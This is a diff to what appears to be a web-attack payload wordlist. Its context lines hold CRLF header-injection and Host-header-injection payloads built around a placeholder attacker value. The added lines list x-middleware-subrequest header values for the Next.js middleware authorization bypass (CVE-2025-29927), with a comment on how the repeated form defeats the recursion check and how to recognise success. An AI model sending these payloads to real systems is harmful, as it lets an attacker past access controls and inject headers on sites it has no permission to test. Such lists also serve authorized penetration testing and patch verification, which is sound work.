@@ -166,3 +166,12 @@ localhost.admin
 {{EVIL}}%0d%0aX-Injected:1
 {{HOST}}%0d%0aHost:{{EVIL}}
 {{HOST}}/{{EVIL}}
+
+# ========== Next.js middleware bypass (CVE-2025-29927) ==========
+# Values for the x-middleware-subrequest header; the repeated form defeats the
+# recursion-depth check on newer versions. Success = a protected path returns 200.
+middleware
+src/middleware
+pages/_middleware
+middleware:middleware:middleware:middleware:middleware
+src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
